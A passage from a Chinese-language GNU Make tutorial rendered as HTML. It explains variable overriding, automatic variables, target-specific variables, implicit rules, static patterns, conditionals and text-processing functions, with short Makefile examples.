class="language-bash">如果变量值中有空格，需要用引号</span><br>make OverridDemo=“This Is From Out Shell”<br></code></pre></td></tr></table></figure><p>则输出OverridDemo的值是ThisIsFromOutShell或This Is From Out Shell。</p><p>用这样的命令参数会覆盖Makefile中对应变量的值，如果不想被覆盖，可以在变量前加上override指令，override具有较高优先级，不会被命令参数覆盖</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">override</span> OverridDemo := ThisIsInMakefile<br><span class="hljs-section">all:</span><br>    @echo <span class="hljs-variable">$(OverridDemo)</span><br></code></pre></td></tr></table></figure><p>这样即使命令行指定参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">make OverridDemo=ThisIsFromOutShell<br></code></pre></td></tr></table></figure><p>输出结果依然是ThisIsInMakefile</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h3 id="自动变量"><a href="#自动变量" class="headerlink" title="自动变量"></a>自动变量</h3><p>**$@**：①本条规则的目标名；②如果目标是归档文件的成员，则为归档文件名；③在多目标的模式规则中, 为导致本条规则方法执行的那个目标名；</p><p>**$&lt;**：本条规则的第一个依赖名称</p><p>**$?**：依赖中修改时间晚于目标文件修改时间的所有文件名，以空格隔开</p><p><strong>$^</strong>：所有依赖文件名，文件名不会重复，不包含order-only依赖</p><p>**$+**：类似上一个， 表示所有依赖文件名，包括重复的文件名，不包含order-only依赖</p><p>**$|**：所有order-only依赖文件名</p><p>__$*__：(简单理解)目标文件名的主干部分(即不包括后缀名)</p><p>**$%**：如果目标不是归档文件，则为空；如果目标是归档文件成员，则为对应的成员文件名</p><p>&nbsp;</p><p>以下变量对应上述变量，D为对应变量所在的目录，结尾不带&#x2F;，F为对应变量除去目录部分的文件名</p><p><strong>$(@D)</strong></p><p><strong>$(@F)</strong></p><p><strong>$(*D)</strong></p><p><strong>$(*F)</strong></p><p><strong>$(%D)</strong></p><p><strong>$(%F)</strong></p><p><strong>$(&lt;D)</strong></p><p><strong>$(&lt;F)</strong></p><p><strong>$(^D)</strong></p><p><strong>$(^F)</strong></p><p><strong>$(+D)</strong></p><p><strong>$(+F)</strong></p><p><strong>$(?D)</strong></p><p><strong>$(?F)</strong></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h3 id="绑定目标的变量"><a href="#绑定目标的变量" class="headerlink" title="绑定目标的变量"></a>绑定目标的变量</h3><p>Makefile中的变量一般是全局变量。也就是说定义之后在Makefile的任意位置都可以使用。但也可以将变量指定在某个目标的范围内，这样这个变量就只能在这个目标对应的规则里面保用</p><p>语法</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">target … : variable-assignment<br>target … : prerequisites<br>    recipes<br>    …<br></code></pre></td></tr></table></figure><p>例</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile">var1 = Global Var<br><br><span class="hljs-section">first: all t2</span><br><br><span class="hljs-section">all: var2 = Target All Var</span><br><span class="hljs-section">all:</span><br>    @echo <span class="hljs-variable">$(var1)</span><br>    @echo <span class="hljs-variable">$(var2)</span><br><br><span class="hljs-section">t2:</span><br>    @echo <span class="hljs-variable">$(var1)</span><br>    @echo <span class="hljs-variable">$(var2)</span><br></code></pre></td></tr></table></figure><p>这种定义变量的方式，目标也可以使用模式匹配，这样所有能匹配上的目标范围内都可以使用这些变量</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile">var1 = Global Var<br><br><span class="hljs-section">first: all.v t2.v t3</span><br><br><span class="hljs-section">%.v: var2 = Target %.v Var</span><br><span class="hljs-section">all.v:</span><br>    @echo <span class="hljs-variable">$@</span> -- <span class="hljs-variable">$(var1)</span><br>    @echo <span class="hljs-variable">$@</span> -- <span class="hljs-variable">$(var2)</span><br><br><span class="hljs-section">t2.v:</span><br>    @echo <span class="hljs-variable">$@</span> -- <span class="hljs-variable">$(var1)</span><br>    @echo <span class="hljs-variable">$@</span> -- <span class="hljs-variable">$(var2)</span><br><span class="hljs-section">t3:</span><br>    @echo <span class="hljs-variable">$@</span> -- <span class="hljs-variable">$(var1)</span><br>    @echo <span class="hljs-variable">$@</span> -- <span class="hljs-variable">$(var2)</span><br></code></pre></td></tr></table></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h3 id="二次展开"><a href="#二次展开" class="headerlink" title="二次展开"></a>二次展开</h3><p>前面说过依赖中的变量都是在Makefile读取阶段立即展开的。如果想让依赖的的变量延迟展开，可以使用.SECONDEXPANSION:，添加之后，在依赖中使用变量时用<code>$$</code>，可以让变量在第二阶段进行二次展开，从而达到延迟展开的效果。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile">VAR1 = main.cpp<br><span class="hljs-section">.SECONDEXPANSION:</span><br><span class="hljs-section">all: $<span class="hljs-variable">$(VAR1)</span></span><br>    @echo <span class="hljs-variable">$^</span><br><br>VAR1 = hello.cpp<br></code></pre></td></tr></table></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h1 id="自动推导与隐式规则"><a href="#自动推导与隐式规则" class="headerlink" title="自动推导与隐式规则"></a>自动推导与隐式规则</h1><p>Makefile中有一些生成目标文件的规则使用频率非常高，比如由.c或.cpp文件编译成.o文件，这样的规则在make中可以自动推导，所以可以不用明确写出来，这样的规则称为隐式规则。</p><h2 id="一些make预定义的规则"><a href="#一些make预定义的规则" class="headerlink" title="一些make预定义的规则"></a>一些make预定义的规则</h2><h3 id="C语言编译"><a href="#C语言编译" class="headerlink" title="C语言编译"></a>C语言编译</h3><p>从.c到.o</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(CPPFLAGS)</span> <span class="hljs-variable">$(CFLAGS)</span> -c<br></code></pre></td></tr></table></figure><h3 id="C-编译"><a href="#C-编译" class="headerlink" title="C++编译"></a>C++编译</h3><p>从.cc .cpp .C到.o</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(CXX)</span> <span class="hljs-variable">$(CPPFLAGS)</span> <span class="hljs-variable">$(CXXFLAGS)</span> -c<br></code></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>由.o文件链接到可执行文件</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(LDFLAGS)</span> *.o <span class="hljs-variable">$(LOADLIBES)</span> <span class="hljs-variable">$(LDLIBS)</span><br></code></pre></td></tr></table></figure><h2 id="隐式规则中常用一些变量"><a href="#隐式规则中常用一些变量" class="headerlink" title="隐式规则中常用一些变量"></a>隐式规则中常用一些变量</h2><p>这些变量都有默认值，也可以自行修改</p><h3 id="CC"><a href="#CC" class="headerlink" title="CC"></a>CC</h3><p>编译C语言的程序，默认为 <code>cc</code></p><h3 id="CXX"><a href="#CXX" class="headerlink" title="CXX"></a>CXX</h3><p>编译C++的程序，默认为 <code>g++</code></p><h3 id="AR"><a href="#AR" class="headerlink" title="AR"></a>AR</h3><p>归档程序，默认为 <code>ar</code></p><h3 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h3><p>C语言预处理程序，默认为 <code>$(CC) -E</code></p><h3 id="RM"><a href="#RM" class="headerlink" title="RM"></a>RM</h3><p>删除文件的程序，默认为<code>rm -f</code></p><h3 id="CFLAGS"><a href="#CFLAGS" class="headerlink" title="CFLAGS"></a>CFLAGS</h3><p>传递给C编译器的一些选项，如-O2 -Iinclude</p><h3 id="CXXFLAGS"><a href="#CXXFLAGS" class="headerlink" title="CXXFLAGS"></a>CXXFLAGS</h3><p>传递给C++编译器的一些选项，如-std&#x3D;c++ 11 -fexec-charset&#x3D;GBK   </p><h3 id="CPPFLAGS"><a href="#CPPFLAGS" class="headerlink" title="CPPFLAGS"></a>CPPFLAGS</h3><p>C语言预处理的一些选项</p><h3 id="LDFLAGS"><a href="#LDFLAGS" class="headerlink" title="LDFLAGS"></a>LDFLAGS</h3><p>链接选项，如-L.</p><h3 id="LDLIBS"><a href="#LDLIBS" class="headerlink" title="LDLIBS"></a>LDLIBS</h3><p>链接需要用到的库，如-lkernel32 -luser32 -lgdi32</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h1 id="多目标与多规则"><a href="#多目标与多规则" class="headerlink" title="多目标与多规则"></a>多目标与多规则</h1><p>显式规则中一条规则可以有多个目标，多个目标可以是相互独立的目标，也可以是组合目标，用写法来区分</p><h2 id="独立多目标"><a href="#独立多目标" class="headerlink" title="独立多目标"></a>独立多目标</h2><p>相互独立的多个目标与依赖之间直接用<code>:</code>，常用这种方式的有以下两种情况</p><ol><li><p>只需要写目标和依赖，不需要写方法的时候</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">block.o input.o scene.o : common.h<br></code></pre></td></tr></table></figure><p>这种写法等价于</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile">block.o : common.h<br>input.o : common.h<br>scene.o : common.h<br></code></pre></td></tr></table></figure></li><li><p>生成(更新)目标的方法写法一样的，只是依赖与目标不一样时。之前写的Makfile中，有如下代码：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">block.o: block.cpp common.h block.h color.h</span><br>    g++ -c block.cpp<br><span class="hljs-section">command.o: command.cpp command.h scene.h</span><br>    g++ -c command.cpp<br><span class="hljs-section">input.o: input.cpp common.h utility.inl</span><br>    g++ -c input.cpp<br><span class="hljs-section">main.o: main.cpp scene.h input.h test.h</span><br>    g++ -c main.cpp<br><span class="hljs-section">scene.o: scene.cpp common.h scene.h utility.inl</span><br>    g++ -c scene.cpp<br><span class="hljs-section">test.o: test.cpp test.h</span><br>    g++ -c test.cpp<br></code></pre></td></tr></table></figure><p>所有.o文件的生成都用的同一方法</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">g++ -c &lt;文件名&gt;<br></code></pre></td></tr></table></figure><p>如果不考虑依赖源文件进行更新时，可以进行简写如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">block.o command.o input.o main.o scene.o test.o : common.h block.h command.h ...<br>    g++ -c $(@:%.o=%.cpp)<br></code></pre></td></tr></table></figure><p>这种写法实际上等价于</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile">block.o : common.h block.h command.h ...<br>    g++ -c <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> .o,.cpp,<span class="hljs-variable">$@</span>)</span><br>command.o : common.h block.h command.h ...<br>    g++ -c <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> .o,.cpp,<span class="hljs-variable">$@</span>)</span><br>input.o : common.h block.h command.h ...<br>    g++ -c <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> .o,.cpp,<span class="hljs-variable">$@</span>)</span><br>main.o : common.h block.h command.h ...<br>    g++ -c <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> .o,.cpp,<span class="hljs-variable">$@</span>)</span><br>scene.o : common.h block.h command.h ...<br>    g++ -c <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> .o,.cpp,<span class="hljs-variable">$@</span>)</span><br>test.o : common.h block.h command.h ...<br>    g++ -c <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> .o,.cpp,<span class="hljs-variable">$@</span>)</span><br></code></pre></td></tr></table></figure><p>其中，$@表示的是目标名称。subst是一个字符串替换函数，$(subst .o,.cpp,$@)表示将目标名称中的.o替换为.cpp。</p><p>这样的简写可以减少内容的书写量，但是不利于将每个目标与依赖分别对应。</p></li></ol><p>独立多目标虽然写在一起，但是每个目标都是单独调用一次方法来更新的。和分开写效果一样。</p><h2 id="组合多目标"><a href="#组合多目标" class="headerlink" title="组合多目标"></a>组合多目标</h2><p>多目标与依赖之前用<code>&amp;:</code>，这样的多个目标称为组合目标。与独立多目标的区别在于，独立多目标每个目标的更新需要单独调用一次更新方法。而组合多目标调用一次方法将更新所有目标</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">block.o input.o scene.o &amp;: block.cpp input.cpp scene.cpp common.h<br>    g++ -c block.cpp<br>    g++ -c input.cpp<br>    g++ -c scene.cpp<br></code></pre></td></tr></table></figure><p>所有目标的更新方法都写到其中，每次更新只会调用一次。</p><h2 id="同一目标多条规则"><a href="#同一目标多条规则" class="headerlink" title="同一目标多条规则"></a>同一目标多条规则</h2><p>同一目标可以对应多条规则。同一目标的所有规则中的依赖会被合并。但如果同一目标对应的多条规则都写了更新方法，则会使用最新的一条更新方法，并且会输出警告信息。</p><p>同一目标多规则通常用来给多个目标添加依赖而不用改动已写好的部分。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">input.o: input.cpp utility.inl</span><br>    g++ -c input.cpp<br><span class="hljs-section">main.o: main.cpp scene.h input.h test.h</span><br>    g++ -c main.cpp<br><span class="hljs-section">scene.o: scene.cpp scene.h utility.inl</span><br>    g++ -c scene.cpp<br><br>input.o main.o scene.o : common.h<br></code></pre></td></tr></table></figure><p>同时给三个目标添加了一个依赖common.h，但是不用修改上面已写好的部分。</p><h1 id="静态模式"><a href="#静态模式" class="headerlink" title="静态模式"></a>静态模式</h1><p>独立多目标可以简化Makefile的书写，但是不利于将各个目标的依赖分开，让目标文件根据各自的依赖进行更新。静态模式可以在一定程度上改进依赖分开问题。</p><p>静态模式就是用<code>%</code>进行文件匹配来推导出对应的依赖。</p><p><strong>语法</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile">targets …: target-pattern(目标模式): prereq-patterns(依赖模式) …<br>        recipe<br>        …<br></code></pre></td></tr></table></figure><p>先看一个例子</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">block.o : %.o : %.cpp %.h<br>    g++ -c <span class="hljs-variable">$&lt;</span><br></code></pre></td></tr></table></figure><p>block.o为目标，%.o为目标模式，%.cpp，%.h为依赖模式，对于这一条规则，%.o代表的是目标文件block.o，所以这里的%匹配的是block，因此，%.cpp表示block.cpp，%.h代表block.h，所以block.o : %.o : %.cpp %.h表示的意思同下面这种写法</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">block.o : block.cpp block.h<br></code></pre></td></tr></table></figure><p>自动推导出block.o依赖block.cpp和block.h。</p><p>另外，$&lt;表示目标的第一个依赖，在这条规则中，$&lt;表示block.cpp</p><p>对应的Makefile可以做如下改进</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">block.o command.o input.o scene.o test.o: %.o : %.cpp %.h<br>    g++ -c <span class="hljs-variable">$&lt;</span><br><span class="hljs-section">main.o: main.cpp scene.h input.h test.h</span><br>    g++ -c main.cpp<br></code></pre></td></tr></table></figure><p>用这种方式可以在简写的同时一定程度上解决各个目标对应的依赖问题。</p><p>(不属于静态模式的内容，隐式规则的内容)利用模式匹配可以直接将所有.cpp到.o文件的编译简写为如下</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">%.o : %.cpp %.h<br>    g++ -c <span class="hljs-variable">$&lt;</span><br></code></pre></td></tr></table></figure><h1 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h1><p>使用条件指令可以让make执行或略过Makefile文件中的一些部分。</p><p><strong>ifdef</strong>  判断一个变量是已否定义</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs makefile">OS = Linux<br><span class="hljs-keyword">ifdef</span> Win<br>    OS = Windows<br><span class="hljs-keyword">endif</span><br><br><br>OS = Linux<br><span class="hljs-keyword">ifdef</span> Win<br>    OS = Windows<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">ifdef</span> Mac<br>    OS= MacOS<br><span class="hljs-keyword">endif</span><br><br><br><span class="hljs-keyword">ifdef</span> Win<br>    OS = Windows<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">ifdef</span> Mac<br>    OS= MacOS<br><span class="hljs-keyword">else</span> <br>    OS = Linux<br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><p><strong>ifndef</strong> 判断一个变量是否没被定义</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">ifndef</span> FLAGS<br>    FLAGS = -finput-charset=utf-8<br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><p><strong>ifeq</strong> 判断两个值是否相等</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs makefile">version = 3.0<br><br><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(version)</span>,1.0)            <span class="hljs-comment"># ifeq后一定要一个空格</span><br>    msg := 版本太旧了，请更新版本<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(version)</span>, 3.0)<br>    msg := 版本太新了，也不行<br><span class="hljs-keyword">else</span><br>    msg := 版本可以用<br><span class="hljs-keyword">endif</span><br><br><br><span class="hljs-comment"># 另外的写法</span><br>msg = Other<br><span class="hljs-keyword">ifeq</span> <span class="hljs-string">&quot;<span class="hljs-variable">$(OS)</span>&quot;</span> <span class="hljs-string">&quot;Windows_NT&quot;</span><br>    msg = This is a Windows Platform<br><span class="hljs-keyword">endif</span><br><br><span class="hljs-keyword">ifeq</span> &#x27;<span class="hljs-variable">$(OS)</span>&#x27; &#x27;Windows_NT&#x27;<br><br><span class="hljs-keyword">ifeq</span> &#x27;<span class="hljs-variable">$(OS)</span>&#x27; <span class="hljs-string">&quot;Windows_NT&quot;</span><br></code></pre></td></tr></table></figure><p><strong>ifneq</strong> 判断两个值是否不等</p><p>用法及参数同ifeq，只是判断结果相反</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h1 id="文本处理函数"><a href="#文本处理函数" class="headerlink" title="文本处理函数"></a>文本处理函数</h1><p>C语言中，函数调用方法是function(arguments)；但在Makefile中调用函数的写法不同</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(function arguments)</span> 或 $&#123;function arguments&#125;<br><span class="hljs-variable">$(function arg1,<span class="hljs-variable">$(arg2)</span>,arg3 ...)</span>  <span class="hljs-comment"># 参数之间不要有空格</span><br></code></pre></td></tr></table></figure><h2 id="字符替换与分析"><a href="#字符替换与分析" class="headerlink" title="字符替换与分析"></a>字符替换与分析</h2><h4 id="subst"><a href="#subst" class="headerlink" title="subst"></a><strong>subst</strong></h4><p>文本替换函数，返回替换后的文本</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">subst</span> target,replacement,text)</span><br>        --- 用relacement替换text中的target<br>        --- target 需要替换的内容<br>        --- replacement 替换为的内容<br>        --- text 需要处理的内容，可以是任意字符串<br><br><br><br>objs = main.o hello.o<br>srcs = <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> .o,.cpp,<span class="hljs-variable">$(objs)</span>)</span><br>headers = <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> .cpp,.h,<span class="hljs-variable">$(srcs)</span>)</span><br><br><span class="hljs-section">all:</span><br>    @echo <span class="hljs-variable">$(srcs)</span><br>    @echo <span class="hljs-variable">$(headers)</span><br></code></pre></td></tr></table></figure><p><strong>patsubst</strong></p><p>模式替换， 返回替换后的文本</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">patsubst</span> pattern,replacement,text)</span><br>        --- pattern 需要替换的模式<br>        --- replacement 需要替换为<br>        --- text 待处理内容，各项内容需要用空格隔开<br><br><br>objs = main.ohello.o<br>srcs = <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> %.o,%.cpp,<span class="hljs-variable">$(objs)</span>)</span><br>headers = <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> %.cpp,%.h,<span class="hljs-variable">$(srcs)</span>)</span>    <br></code></pre></td></tr></table></figure><h4 id="strip"><a href="#strip" class="headerlink" title="strip"></a><strong>strip</strong></h4><p>去除字符串头部和尾部的空格，中间如果连续有多个空格，则用一个空格替换，返回去除空格后的文本</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">strip</span> string)</span><br>        --- string 需要去除空格的字符串<br><br><br>files = aa hello.cpp      main.cpp     test.cpp<br>files := <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> aa,        ,<span class="hljs-variable">$(files)</span>)</span><br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">strip</span> <span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="findstring"><a href="#findstring" class="headerlink" title="findstring"></a>findstring</h4><p>查找字符串，如果找到了，则返回对应的字符串，如果没找到，则反回空串</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">findstring</span> find,string)</span><br>        --- find 需要查找的字符串<br>        --- string 用来查找的内容<br><br>files = hello.cpp main.cpp test.cpp<br>find = <span class="hljs-variable">$(<span class="hljs-built_in">findstring</span> hel,<span class="hljs-variable">$(files)</span>)</span><br>find = <span class="hljs-variable">$(<span class="hljs-built_in">findstring</span> HEL,<span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><p>从文本中筛选出符合模式的内容并返回</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">filter</span> pattern…,text)</span><br>        --- pattern 模式，可以有多个，用空格隔开<br>        --- text 用来筛选的文本，多项内容需要用空格隔开，否则只会当一项来处理<br><br>files = hello.cpp main.cpp test.cpp main.o hello.o hello.h<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">filter</span> %.o %.h,<span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="filter-out"><a href="#filter-out" class="headerlink" title="filter-out"></a>filter-out</h4><p>与filter相反，过滤掉符合模式的，返回剩下的内容</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">filter</span>-out pattern…,text)</span><br>        --- pattern 模式，可以有多个，用空格隔开<br>        --- text 用来筛选的文本，多项内容需要用空格隔开，否则只会当一项来处理<br><br><br>files = hello.cpp main.cpp test.cpp main.o hello.o hello.h<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">filter</span>-out %.o %.cpp,<span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>将文本内的各项按字典顺序排列，并且移除重复项</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">sort</span> list)</span><br>        --- list 需要排序内容<br><br><br>files = hello.cpp main.cpp test.cpp main.o hello.o hello.h main.cpp hello.cpp<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">sort</span> <span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="word"><a href="#word" class="headerlink" title="word"></a>word</h4><p>用于返回文本中第n个单词</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">word</span> n,text)</span><br>        --- n 第n个单词，从1开始，如果n大于总单词数，则返回空串<br>        --- text 待处理文本<br><br>files = hello.cpp main.cpp test.cpp main.o hello.o hello.h main.cpp hello.cpp<br>files2 = <span class="hljs-variable">$(<span 